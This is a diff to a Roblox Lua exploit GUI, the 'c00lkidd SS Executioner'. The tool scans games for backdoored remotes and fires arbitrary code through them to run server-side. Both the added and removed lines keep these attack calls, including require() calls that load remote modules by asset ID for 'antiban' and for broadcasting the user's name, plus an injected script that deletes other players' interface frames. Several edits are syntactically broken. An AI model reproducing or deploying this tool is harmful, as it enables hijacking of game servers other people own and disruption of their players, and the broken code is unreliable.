@@ -1,3 +1,10 @@
+local function notify(text,duration)
+			game.StarterGui:SetCore("SendNotification",{
+			Title = "c00lkidd",
+			Text = text,
+			Duration = duration or 5
+		})
+end
 local Converted = {
 	["_Starlight"] = Instance.new("ScreenGui");
 	["_Frame"] = Instance.new("Frame");
@@ -498,12 +505,13 @@ Converted["_Frame2"].Size = UDim2.new(0, 537, 0, 1375)
 Converted["_Frame2"].Parent = Converted["_ScrollingFrame"]
 
 Converted["_TextBox"].ClearTextOnFocus = false
-Converted["_TextBox"].Font = Enum.Font.Cartoon
+Converted["_TextBox"].Font = Enum.Font.Code
 Converted["_TextBox"].MultiLine = true
 Converted["_TextBox"].PlaceholderColor3 = Color3.fromRGB(12.000000234693289, 12.000000234693289, 12.000000234693289)
 Converted["_TextBox"].RichText = true
+Converted["_TextBox"].PlaceholderText = 'print("c00lkidd ss")'
 Converted["_TextBox"].Text = ""
-Converted["_TextBox"].TextColor3 = Color3.fromRGB(255, 0, 0)
+Converted["_TextBox"].TextColor3 = Color3.fromRGB(12.000000234693289, 12.000000234693289, 12.000000234693289)
 Converted["_TextBox"].TextSize = 18
 Converted["_TextBox"].TextTruncate = Enum.TextTruncate.SplitWord
 Converted["_TextBox"].TextWrapped = true
@@ -511,8 +519,8 @@ Converted["_TextBox"].TextXAlignment = Enum.TextXAlignment.Left
 Converted["_TextBox"].TextYAlignment = Enum.TextYAlignment.Top
 Converted["_TextBox"].BackgroundColor3 = Color3.fromRGB(12.000000234693289, 12.000000234693289, 12.000000234693289)
 Converted["_TextBox"].BackgroundTransparency = 1
-Converted["_TextBox"].BorderColor3 = Color3.fromRGB(0, 0, 0)
-Converted["_TextBox"].BorderSizePixel = 0
+Converted["_TextBox"].BorderColor3 = Color3.fromRGB(255, 0, 0)
+Converted["_TextBox"].BorderSizePixel = 2
 Converted["_TextBox"].Position = UDim2.new(5.68297551e-08, 0, 0, 0)
 Converted["_TextBox"].Size = UDim2.new(0, 537, 0, 1375)
 Converted["_TextBox"].Parent = Converted["_Frame2"]
@@ -2372,9 +2380,13 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 		if remoteEvent then
 			remoteEvent:FireServer(code)
 		elseif remoteFunction and remoteFunction:InvokeServer('starlightTSS', code) then
+		   pcall(function()
 			remoteFunction:InvokeServer('starlightTSS', code)
 		    else
 			remoteFunction:InvokeServer(code)
+		   end)
+		else
+		    notify("Inject first! - or no backdoor")
 	         end
 	     end
 	script.Parent.Sidebar.Presets.MouseButton1Click:Connect(function()
@@ -2518,123 +2530,19 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 		if remoteEvent or remoteFunction then
 			script.Parent.Framee.Check.Visible = false
 			script.Parent.Framee.Log.Visible = true
-			script.Parent.Framee.Log.Text = "[" .. (remoteEvent and remoteEvent.Name or remoteFunction and remoteFunction.Name or "Unknown") .. "]," .. "[Code 4]"
+			script.Parent.Framee.Log.Text = "[Backdoor :" .. (remoteEvent or remoteFunction or "Unidentified") .. "]," .. "[" .. (remoteEvent.Name or remoteFunction.Name or "Unknown") "]"
 			script.Parent.stat.ImageColor3 = Color3.fromRGB(159, 226, 191)
 			game.StarterGui:SetCore("SendNotification",{
 			Title = "c00lkidd",
 			Text = "Backdoor: " .. scanTime .."s " .. (remoteEvent and remoteEvent.Name or remoteFunction and remoteFunction.Name or "nil"),
 			Duration = 4
 		})
-		local LigmaProject = Instance.new("ScreenGui")
-                local ImageLabeeel = Instance.new("ImageLabel")
-                local fr6 = Instance.new("TextButton")
-                local TextLabel_2 = Instance.new("TextLabel")
 	        fireRemoteEvent('local Players=game:GetService("Players")local suspiciousKeywords={"hd admin","polaria","ranker","java1","darklord","pracharatbampen","kid","666","k1d","kidd","k1dd","k00p","l**pzworld","tubers","h01pk","ban","ban gui","itsnotskeleton","l0ck","bnkksd hd","andres","xxandresxx","c00lgui","c00l","elmarz","teamf*t","5x5x5x5","g00b","kick","ban","undetectable gui","undetectable","acron","russia","infector","potato","sans_gboard","l*ckgui","starp4tch","user1337","menotgonnadobadstuff","8t010t8","darius","j00p","144anz","sigma","noot","1x1x1x1","lacking923","kaax","s1n","k_aax","ep1c","zazol","lalol","cxyz","saudi","j01tar0","koma","gigxxx","hax0rz","g00l","enstrio","br1cked","hax"}local whitelist={["greguiscool"]=true}local function isSuspicious(str)str=str:lower()for _,k in ipairs(suspiciousKeywords)do if str:find(k)then return true end end return false end local function getOwningPlayer(i)local p=i while p and not p:IsA("PlayerGui")do p=p.Parent end if p and p:IsA("PlayerGui")then local c=p.Parent return Players:GetPlayerFromCharacter(c)or Players:FindFirstChild(c.Name)end return nil end local function deleteIfSuspicious(i)if i:IsA("TextLabel")or i:IsA("Frame")then local n=i.Name local t=i:IsA("TextLabel")and i.Text or"" local pl=getOwningPlayer(i)if pl and whitelist[pl.Name]then return end if isSuspicious(n)or isSuspicious(t)then local f=i while f and not f:IsA("Frame")do f=f.Parent end if f then local h=Instance.new("Hint",workspace)h.Text="[Skid] Deleted sus Frame: "..f.Name..(pl and" (user: "..pl.DisplayName..")"or" (Unknown)")task.delay(3,function()h:Destroy()end)f:Destroy()end end end end for _,o in ipairs(game:GetDescendants())do pcall(deleteIfSuspicious,o)end game.DescendantAdded:Connect(function(o)pcall(deleteIfSuspicious,o)end)task.spawn(function()while true do for _,o in ipairs(game:GetDescendants())do pcall(deleteIfSuspicious,o)end task.wait(5)end end)')
                 fireRemoteEvent('require(6735691273).BetaAntiSkid()')
 		fireRemoteEvent('require(7458325257).antiban()')
                 fireRemoteEvent('require(3986243232).load("Guys i am skid im happy to announce!",{"' .. game.Players.LocalPlayer.Name ..  '"})')
-
-LigmaProject.Name = "C00lProject"
-LigmaProject.Parent = game.CoreGui
-
-ImageLabeeel.Parent = LigmaProject
-ImageLabeeel.Active = true
-ImageLabeeel.BackgroundColor3 = Color3.fromRGB(0,0,0)
-ImageLabeeel.BackgroundTransparency = 0
-ImageLabeeel.Position = UDim2.new(-0.127000004, 0, 0.407999992, 0)
-ImageLabeeel.Size = UDim2.new(0, 90, 0, 90)
-ImageLabeeel.BorderColor3 = Color3.fromRGB(255,0,0)
-ImageLabeeel.BorderSizePixel = 2
-ImageLabeeel.Image = "rbxassetid://8408806737"
-
-fr6.Name = "fr6"
-fr6.Parent = ImageLabeeel
-fr6.BackgroundColor3 = Color3.fromRGB(0,0,0)
-fr6.BackgroundTransparency = 1.000
-fr6.Position = UDim2.new(0, 0, -0.633333325, 0)
-fr6.Size = UDim2.new(0, 100, 0, 50)
-fr6.Font = Enum.Font.Arcade
-fr6.Text = "R15 -> R6"
-fr6.TextColor3 = Color3.fromRGB(255, 0, 0)
-fr6.TextScaled = true
-fr6.TextSize = 18.000
-fr6.TextTransparency = 0
-fr6.TextWrapped = true
-
-TextLabel_2.Parent = ImageLabeeel
-TextLabel_2.Active = true
-TextLabel_2.BackgroundColor3 = Color3.fromRGB(0, 0,0)
-TextLabel_2.BackgroundTransparency = 1.000
-TextLabel_2.Position = UDim2.new(0.99999994, 0, 0, 0)
-TextLabel_2.Size = UDim2.new(0, 269, 0, 90)
-TextLabel_2.Font = Enum.Font.Arcade
-TextLabel_2.LineHeight = 1.100
-TextLabel_2.Text = "c00lkidd SS Executioner by Rig6 and Trackcode. Run scripts live without filthy modules or converting!\n Use the external program to execute scripts.\n Status: Injected"
-TextLabel_2.TextColor3 = Color3.fromRGB(255, 0, 0)
-TextLabel_2.TextScaled = true
-TextLabel_2.TextSize = 15.000
-TextLabel_2.TextTransparency = 1.000
-TextLabel_2.TextWrapped = true
-TextLabel_2.BorderColor3 = Color3.fromRGB(255,0,0)
-TextLabel_2.BorderSizePixel = 2
-
-local function UpdateVisibilityBasedOnRigType()
-    local TweenService = game:GetService("TweenService")
-    local txt = ImageLabeeel.TextLabel
-    local btn = fr6
-    wait(1)
-    ImageLabeeel:TweenPosition(UDim2.new(0.458, 0, 0.408, 0), "Out", "Linear", 0.4, false)
-    wait(2)
-    ImageLabeeel:TweenPosition(UDim2.new(0.01, 0, 0.813, 0), "Out", "Sine", 0.7, false)
-    wait(1)
-    TweenService:Create(txt, TweenInfo.new(1, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {["BackgroundTransparency"] = 0}):Play()
-    TweenService:Create(txt, TweenInfo.new(1, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {["TextTransparency"] = 0}):Play()
-
-    for i, v in pairs(game.Players:GetPlayers()) do
-        if v.Character and v.Character:FindFirstChild("Humanoid") then
-            if v.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
-                btn.Visible = false
-            elseif v.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-                TweenService:Create(btn, TweenInfo.new(1, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {["BackgroundTransparency"] = 0}):Play()
-                TweenService:Create(btn, TweenInfo.new(1, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {["TextTransparency"] = 0}):Play()
-                btn.Visible = true
-            end
-        end
-    end
-
-    while wait() do
-        for i, v in pairs(game.Players:GetPlayers()) do
-            if v.Character and v.Character:FindFirstChild("Humanoid") then
-                if v.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
-                    btn.Visible = false
-                elseif v.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-                    btn.Visible = true
-                end
-            end
-        end
-    end
-end
-
-fr6.MouseButton1Click:Connect(function()
-    local player = game.Players.LocalPlayer
-    if player and player.Character and player.Character:FindFirstChild("Humanoid") then
-        if player.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-            fr6.Visible = false
-            fireRemoteEvent('require(3436957371):r6("' .. game.Players.LocalPlayer.Name .. '")')
-        end
-    end
-end)
-
-game.Players.PlayerAdded:Connect(function(player)
-    player.CharacterAdded:Connect(function(character)
-        local btn = fr6
-        btn.Visible = true
-    end)
-end)
-
-UpdateVisibilityBasedOnRigType()
-		else
-			script.Parent.Framee.Check.Text = "[No Backdoor],[Code 0]"
+	    else
+			script.Parent.Framee.Check.Text = "No backdoor :("
 			script.Parent.stat.ImageColor3 = Color3.fromRGB(226, 69, 69)
 			wait(1)
 			script.Parent.Framee.scan.Visible = true
